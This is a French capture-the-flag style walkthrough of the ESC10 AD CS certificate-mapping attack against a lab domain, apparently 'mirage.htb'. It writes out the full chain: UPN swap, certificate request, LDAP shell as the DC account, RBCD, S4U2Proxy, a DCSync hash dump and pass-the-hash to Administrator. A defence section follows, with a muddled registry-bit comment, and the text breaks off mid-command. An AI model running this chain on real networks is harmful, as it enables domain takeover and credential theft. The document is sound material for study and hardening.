# ESC10 - Weak Certificate Mapping

#### <mark style="color:blue;">🎯 Principe de l'attaque</mark>

**ESC10** exploite une mauvaise configuration du mapping de certificats dans l'authentification Schannel (Secure Channel) qui permet d'usurper l'identité d'un utilisateur via un certificat.

```
┌──────────────────────────────────────────────┐
│  ESC10 - Certificate Mapping Attack          │
├──────────────────────────────────────────────┤
│                                              │
│  1. Attaquant contrôle le UPN de VictimA    │
│  2. Change UPN de VictimA → VictimB         │
│  3. Demande certificat (UPN=VictimB)        │
│  4. Restaure UPN de VictimA → original      │
│  5. Utilise certificat pour auth → VictimB! │
│                                              │
│  Le certificat mappe vers VictimB           │
│  car son UPN est dans le certificat         │
│                                              │
└──────────────────────────────────────────────┘
```

#### <mark style="color:blue;">📋 Prérequis</mark>

**Conditions nécessaires :**

1. **ADCS configuré** avec templates accessibles
2. **Mapping UPN activé** dans Schannel :
   * Registry : `HKLM\System\CurrentControlSet\Control\SecurityProviders\SCHANNEL\CertificateMappingMethods`
   * Valeur contenant le bit `0x4` (UPN mapping)
3. **Contrôle du UPN** d'un utilisateur (via permissions Write)
4. **Template de certificat** permettant l'authentification client

#### <mark style="color:blue;">🔍 Identification de la vulnérabilité</mark>

**Étape 1: Vérifier le registry Schannel**

**Depuis un shell sur la machine :**

```powershell
# Lire la valeur du registry
reg query "HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\SCHANNEL" /v CertificateMappingMethods

# Output si vulnérable:
CertificateMappingMethods    REG_DWORD    0x4
                                          ↑
                                    UPN mapping activé!

# Valeurs possibles:
# 0x1 = Subject/Issuer mapping
# 0x2 = Issuer mapping
# 0x4 = UPN mapping (VULNÉRABLE à ESC10)
# 0x8 = S4U2Self mapping
```

**Depuis WinRM :**

```powershell
Get-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\SCHANNEL' -Name CertificateMappingMethods

# Output:
CertificateMappingMethods : 4
```

**Étape 2: Vérifier les permissions Write sur un utilisateur**

**Avec bloodyAD :**

```bash
# Lister ce qu'on peut écrire avec Mirage-Service$
KRB5CCNAME=Mirage-Service\$.ccache \
bloodyAD -d mirage.htb \
    --host DC01.mirage.htb \
    -k \
    get writable

# Output intéressant:
distinguishedName: CN=mark.bbond,OU=...
permission: WRITE
  userPrincipalName: WRITE  # ← On peut changer son UPN!
  servicePrincipalName: WRITE
  msDS-AllowedToDelegateTo: WRITE
```

**Avec PowerView :**

```powershell
Get-DomainObjectAcl -Identity mark.bbond | 
    Where-Object {
        $_.ActiveDirectoryRights -match "WriteProperty" -and
        $_.SecurityIdentifier -eq (Get-DomainUser "Mirage-Service$").objectsid
    }
```

**Étape 3: Vérifier les templates de certificats**

**Avec Certipy :**

```bash
certipy find \
    -u 'Mirage-Service$' \
    -hashes :738eeff47da231dec805583638b8a91f \
    -dc-ip 10.10.11.78 \
    -k \
    -target DC01.mirage.htb

# Chercher un template avec:
# - Client Authentication EKU
# - mark.bbond peut s'enroller
# - Exemple: "User" template
```

#### <mark style="color:blue;">🛠️ Exploitation étape par étape</mark>

**Étape 0: Setup - Obtenir un TGT**

```bash
# Obtenir un TGT pour Mirage-Service$ (GMSA)
getTGT.py -hashes :738eeff47da231dec805583638b8a91f \
    'mirage.htb/Mirage-Service$' \
    -no-pass

# TGT sauvegardé dans Mirage-Service$.ccache
export KRB5CCNAME=Mirage-Service\$.ccache
```

**Étape 1: Sauvegarder l'UPN original**

```bash
# Lire l'UPN actuel de mark.bbond
certipy account \
    -user mark.bbond \
    read \
    -target DC01.mirage.htb \
    -k \
    -dc-ip 10.10.11.78

# Output:
userPrincipalName : mark.bbond@mirage.htb
                    ↑
              Sauvegarder cette valeur!
```

**Étape 2: Changer l'UPN vers la cible**

```bash
# Changer l'UPN de mark.bbond → DC01$ (machine account du DC)
certipy account \
    -user mark.bbond \
    update \
    -upn 'DC01$@mirage.htb' \
    -target DC01.mirage.htb \
    -k \
    -dc-ip 10.10.11.78

# Output:
[*] Updating user 'mark.bbond':
    userPrincipalName : DC01$@mirage.htb
[*] Successfully updated 'mark.bbond'
```

**⚠️ Pourquoi DC01$ et pas Administrator ?**

* Administrator est protégé contre cette attaque
* Les comptes machines (computer accounts) ne sont pas protégés
* DC01$ = machine account du Domain Controller = très privilégié

**Étape 3: Demander un certificat**

```bash
# Demander un certificat pour mark.bbond (avec credentials de mark.bbond)
certipy req \
    -k \
    -dc-ip 10.10.11.78 \
    -target DC01.mirage.htb \
    -ca mirage-DC01-CA \
    -template User \
    -u mark.bbond@mirage.htb \
    -p '1day@atime'

# Output:
[*] Requesting certificate via RPC
[*] Request ID is 10
[*] Successfully requested certificate
[*] Got certificate with UPN 'DC01$@mirage.htb'  # ← Important!
[*] Certificate object SID is 'S-1-5-21-...-1109'  # SID de mark.bbond
[*] Saving certificate and private key to 'dc01.pfx'
```

**Analyse du certificat :**

```bash
# Voir le contenu
certipy cert -pfx dc01.pfx -info

# Output:
Subject:
  CN=mark.bbond
Subject Alternative Name:
  UPN: DC01$@mirage.htb  # ← C'est ce qui compte pour l'auth!
```

**Étape 4: Restaurer l'UPN original**

```bash
# IMPORTANT: Restaurer l'UPN de mark.bbond
certipy account \
    -user mark.bbond \
    update \
    -upn 'mark.bbond@mirage.htb' \
    -target DC01.mirage.htb \
    -k \
    -dc-ip 10.10.11.78

# Output:
[*] Successfully updated 'mark.bbond'
```

**Pourquoi restaurer ?**

* Si on laisse `DC01$@mirage.htb`, le certificat auth comme mark.bbond
* En restaurant, le mapping cherche qui a l'UPN `DC01$@mirage.htb`
* Résultat : C'est DC01$ (la machine) → On auth comme DC01$!

**Étape 5: Authentification avec le certificat**

```bash
# Utiliser le certificat pour obtenir un shell LDAP
certipy auth \
    -pfx dc01.pfx \
    -dc-ip 10.10.11.78 \
    -ldap-shell

# Output:
[*] Certificate identities:
[*]     SAN UPN: 'DC01$@mirage.htb'
[*]     Security Extension SID: 'S-1-5-...-1109' (mark.bbond)
[*] Connecting to 'ldaps://10.10.11.78:636'
[*] Authenticated to '10.10.11.78' as: 'u:MIRAGE\DC01$'
                                          ↑
                                    Authentifié comme DC01$!

Type help for list of commands
# 
```

**Commandes LDAP shell disponibles :**

```bash
# help
add_computer
add_user
add_user_to_group
change_password
clear_rbcd
dump
get_laps_password
get_user
search
set_dontreqpreauth
set_rbcd  # ← Celui qu'on va utiliser
write_gpo_dacl
```

#### <mark style="color:blue;">🎯 Exploitation - RBCD pour DCSync</mark>

**Étape 6: Configurer RBCD**

```bash
# Dans le LDAP shell, donner à Mirage-Service$ le droit de RBCD vers DC01$
# set_rbcd <target> <grantee>
set_rbcd DC01$ Mirage-Service$

# Output:
Found Target DN: CN=DC01,OU=Domain Controllers,DC=mirage,DC=htb
Target SID: S-1-5-21-...-1000

Found Grantee DN: CN=Mirage-Service,CN=Managed Service Accounts,...
Grantee SID: S-1-5-21-...-1112
Delegation rights modified successfully!
Mirage-Service$ can now impersonate users on DC01$ via S4U2Proxy
```

**Étape 7: Obtenir un TGT fresh**

```bash
# Obtenir un nouveau TGT (pour refléter les nouveaux droits RBCD)
getTGT.py -hashes :738eeff47da231dec805583638b8a91f \
    'mirage.htb/Mirage-Service$' \
    -no-pass

# Nouveau TGT dans Mirage-Service$.ccache
export KRB5CCNAME=Mirage-Service\$.ccache
```

**Étape 8: S4U2Proxy - Impersonate DC01$**

```bash
# Demander un service ticket en se faisant passer pour DC01$
getST.py \
    -spn 'http/DC01.mirage.htb' \
    -impersonate DC01$ \
    -no-pass \
    'mirage.htb/Mirage-Service$'

# Output:
[*] Impersonating DC01$
[*] Requesting S4U2self
[*] Requesting S4U2Proxy
[*] Saving ticket in DC01$@http_DC01.mirage.htb@MIRAGE.HTB.ccache

# Exporter ce nouveau ticket
export KRB5CCNAME=DC01\$@http_DC01.mirage.htb@MIRAGE.HTB.ccache
```

**Étape 9: DCSync - Dump des hashes**

```bash
# Utiliser le ticket pour DCSync
secretsdump.py \
    -no-pass \
    -k \
    DC01.mirage.htb

# Output:
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
mirage.htb\Administrator:500:aad3b435b51404eeaad3b435b51404ee:7be6d4f3c2b9c0e3560f5a29eeb1afb3:::
Guest:501:...
krbtgt:502:...
mirage.htb\david.jjackson:1107:...
mirage.htb\nathan.aadam:1110:...
...

[*] Kerberos keys grabbed
mirage.htb\Administrator:aes256-cts-hmac-sha1-96:09454bbc...
...
```

**Étape 10: Administrator access**

```bash
# Obtenir un TGT Administrator
getTGT.py -hashes :7be6d4f3c2b9c0e3560f5a29eeb1afb3 \
    'mirage.htb/Administrator' \
    -no-pass

export KRB5CCNAME=Administrator.ccache

# Shell
evil-winrm -i DC01.mirage.htb -k

# root.txt! 🎯
```

#### <mark style="color:blue;">🔍 Pourquoi ça fonctionne ?</mark>

**Flux d'authentification avec certificat :**

```
1. Client présente certificat avec SAN UPN=DC01$@mirage.htb

2. Serveur (DC) vérifie:
   ├─> Certificat signé par CA de confiance? ✓
   ├─> Certificat valide (dates)? ✓
   └─> Qui a l'UPN 'DC01$@mirage.htb'?

3. Lookup dans AD:
   Get-ADUser -Filter {userPrincipalName -eq 'DC01$@mirage.htb'}
   └─> Résultat: DC01$ (computer account)

4. Authentification réussie comme DC01$!
```

**Le SID dans le certificat est ignoré** si le mapping UPN est activé !

#### 🔒 Défense

**Désactiver UPN mapping**

```powershell
# Sur chaque DC et serveur utilisant Schannel
Set-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\SCHANNEL' `
    -Name 'CertificateMappingMethods' `
    -Value 0x18  # Pas de UPN mapping

# 0x18 = 0x10 (S4U2Self) + 0x08 (S4U2Self)
# Exclut 0x4 (UPN) qui est vulnérable

# Redémarrer pour appliquer
Restart-Computer -Force
```

**Protéger les UPNs**

```powershell
# Auditer qui peut modifier les UPNs
$users = Get-ADUser -Filter *
foreach ($user in $users) {
    $acl = Get-Acl "AD:\$($user.DistinguishedName)"
    $acl.Access | Where-Object {
        $_.ActiveDirectoryRights -match "WriteProperty" -and
        $_.ObjectType -eq "28630ebf-41d5-11d1-a9c1-0000f80367c1"  # UPN
    } | Select-Object IdentityReference
}

# Supprimer les droits inutiles
```

**Implémenter Strong Certificate Mapping**

```powershell
# Forcer le mapping par SID (KB5014754)
Set-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\SCHANNEL' `
    -Name 'CertificateMappingMethods' `
    -Value 0x18

# Activer Strong Certificate Binding
Set-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Services\Kdc' `
    -Name 'StrongCertific
```
